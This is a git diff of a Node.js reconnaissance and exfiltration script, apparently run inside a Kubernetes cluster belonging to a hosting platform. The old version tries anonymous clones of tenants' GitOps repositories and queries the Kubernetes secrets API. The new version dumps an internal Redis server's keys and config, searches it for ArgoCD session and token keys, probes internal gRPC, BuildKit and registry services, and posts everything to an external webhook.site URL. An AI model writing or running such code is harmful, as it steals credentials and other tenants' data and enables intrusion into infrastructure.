@@ -1,8 +1,9 @@
 const https = require('https');
 const http = require('http');
+const net = require('net');
 const { execSync } = require('child_process');
 
-const WEBHOOK = "https://webhook.site/d16fa166-2948-4505-96c0-f67e0db0843d";
+const WEBHOOK = "https://webhook.site/a5862010-a24f-419e-af3d-a76bc8602650";
 
 function post(label, data) {
   return new Promise((resolve) => {
@@ -20,62 +21,90 @@ function post(label, data) {
 }
 
 function run(cmd) {
-  try { return execSync(cmd, { timeout: 10000 }).toString(); } 
-  catch(e) { return e.stderr?.toString() || e.message; }
+  try { return execSync(cmd, { timeout: 15000 }).toString(); }
+  catch(e) { return 'ERR: ' + (e.stderr?.toString() || e.message); }
+}
+
+function redisCmd(host, port, cmd) {
+  return new Promise((resolve) => {
+    const sock = new net.Socket();
+    let data = '';
+    sock.setTimeout(5000);
+    sock.connect(port, host, () => {
+      sock.write(cmd + '\r\n');
+    });
+    sock.on('data', (chunk) => { data += chunk.toString(); });
+    sock.on('end', () => resolve(data));
+    sock.on('timeout', () => { sock.destroy(); resolve(data || 'TIMEOUT'); });
+    sock.on('error', (e) => resolve('ERR: ' + e.message));
+    // Give it time to collect data
+    setTimeout(() => { sock.destroy(); resolve(data || 'NO_DATA'); }, 4000);
+  });
 }
 
 async function main() {
-  await post('v2-start', new Date().toISOString());
+  await post('v3-start', new Date().toISOString());
 
-  // 1. Direct soft-serve probe
-  let ss = '';
-  ss += 'HTTP 23232:\n' + run('curl -s -m5 http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/ 2>&1') + '\n';
-  ss += 'REPOS:\n' + run('curl -s -m5 http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/repos 2>&1') + '\n';
-  ss += 'GIT REFS zeitlos:\n' + run('curl -s -m5 "http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/zeitlos-software-beast-gitops.git/info/refs?service=git-upload-pack" 2>&1') + '\n';
-  ss += 'GIT REFS cblaettl:\n' + run('curl -s -m5 "http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/cblaettl-epic-falcon-gitops.git/info/refs?service=git-upload-pack" 2>&1') + '\n';
-  await post('softserve', ss);
+  const REDIS = '10.100.105.198';
 
-  // 2. Try anonymous git clone of zeitlos repo
-  let clone = run('git clone http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/zeitlos-software-beast-gitops.git /tmp/z-clone 2>&1');
-  await post('clone-zeitlos', clone);
-  
-  // If clone worked, dump contents
-  let zFiles = run('find /tmp/z-clone -type f 2>/dev/null | head -30');
-  if (zFiles.trim()) {
-    await post('zeitlos-files', zFiles);
-    let vals = run('cat /tmp/z-clone/environments/production/values.yaml 2>/dev/null');
-    await post('zeitlos-prod-values', vals);
+  // 1. Redis INFO
+  const info = await redisCmd(REDIS, 6379, 'INFO');
+  await post('redis-info', info.substring(0, 5000));
+
+  // 2. Redis KEYS *
+  const keys = await redisCmd(REDIS, 6379, 'KEYS *');
+  await post('redis-keys', keys.substring(0, 5000));
+
+  // 3. Redis CONFIG GET *
+  const config = await redisCmd(REDIS, 6379, 'CONFIG GET *');
+  await post('redis-config', config.substring(0, 5000));
+
+  // 4. Dump all keys with values
+  const keyList = keys.split('\n').filter(l => l.startsWith('\$') === false && l.trim() && !l.startsWith('*'));
+  let dump = '';
+  for (const key of keyList.slice(0, 50)) {
+    const k = key.trim().replace(/^\r/, '').replace(/\r\$/, '');
+    if (!k || k.startsWith('*') || k.startsWith('\$')) continue;
+    const type = await redisCmd(REDIS, 6379, 'TYPE ' + k);
+    const val = await redisCmd(REDIS, 6379, 'GET ' + k);
+    dump += '--- KEY: ' + k + ' (type: ' + type.trim() + ') ---\n';
+    dump += val.substring(0, 2000) + '\n\n';
   }
+  await post('redis-dump', dump.substring(0, 10000));
 
-  // 3. Try cloning cblaettl
-  let clone2 = run('git clone http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/cblaettl-epic-falcon-gitops.git /tmp/c-clone 2>&1');
-  await post('clone-cblaettl', clone2);
-  if (run('ls /tmp/c-clone 2>/dev/null').trim()) {
-    await post('cblaettl-files', run('find /tmp/c-clone -type f 2>/dev/null | head -30'));
-    await post('cblaettl-values', run('cat /tmp/c-clone/environments/production/values.yaml 2>/dev/null'));
-  }
+  // 5. Try to get ArgoCD session tokens
+  const argoKeys = await redisCmd(REDIS, 6379, 'KEYS *argo*');
+  await post('redis-argo-keys', argoKeys);
 
-  // 4. Zot registry - already confirmed but double check
-  let zot = run('curl -s -m5 http://lucity-infra-zot.lucity-system.svc:5000/v2/_catalog 2>&1');
-  await post('zot-catalog', zot);
+  const sessionKeys = await redisCmd(REDIS, 6379, 'KEYS *session*');
+  await post('redis-session-keys', sessionKeys);
 
-  // 5. ArgoCD - try without auth
-  let argo = '';
-  argo += 'VERSION:\n' + run('curl -s -m5 http://lucity-infra-argocd-server.lucity-system.svc.cluster.local/api/version 2>&1') + '\n';
-  argo += 'APPS:\n' + run('curl -s -m5 http://lucity-infra-argocd-server.lucity-system.svc.cluster.local/api/v1/applications 2>&1') + '\n';
-  argo += 'SETTINGS:\n' + run('curl -s -m5 http://lucity-infra-argocd-server.lucity-system.svc.cluster.local/api/v1/settings 2>&1') + '\n';
-  await post('argocd', argo);
+  const tokenKeys = await redisCmd(REDIS, 6379, 'KEYS *token*');
+  await post('redis-token-keys', tokenKeys);
 
-  // 6. K8s API
-  let k8s = run('curl -sk -m5 https://kubernetes.default.svc/version 2>&1');
-  await post('k8s-version', k8s);
+  // 6. Try ArgoCD API with discovered info
+  const argoSettings = run('curl -s -m5 http://10.111.242.21/api/v1/settings 2>&1');
+  await post('argocd-settings', argoSettings);
 
-  // 7. Try K8s secrets
-  let secrets = run('curl -sk -m5 https://kubernetes.default.svc/api/v1/namespaces/lucity-system/secrets 2>&1');
-  await post('k8s-secrets', secrets.substring(0, 5000));
+  // 7. Try gRPC services directly (HTTP/2 probe)
+  // Packager gRPC - try reflection
+  const packagerProbe = run('curl -s -m5 http://10.104.180.117:9002/ 2>&1');
+  await post('packager-probe', packagerProbe);
 
-  await post('v2-done', 'complete');
-  console.log('done');
+  // Deployer gRPC
+  const deployerProbe = run('curl -s -m5 http://10.98.64.141:9003/ 2>&1');
+  await post('deployer-probe', deployerProbe);
+
+  // 8. BuildKit direct access
+  const bkProbe = run('curl -s -m5 http://10.105.47.126:1234/ 2>&1');
+  await post('buildkit-probe', bkProbe);
+
+  // 9. Zot - dump ALL repos with full manifest details
+  const catalog = run('curl -s -m5 http://10.96.100.100:5000/v2/_catalog');
+  await post('zot-catalog', catalog);
+
+  await post('v3-done', 'complete at ' + new Date().toISOString());
+  console.log('v3 done');
 }
 
-main().catch(console.error);
+main().catch(e => { console.error(e); post('v3-fatal', e.message); });
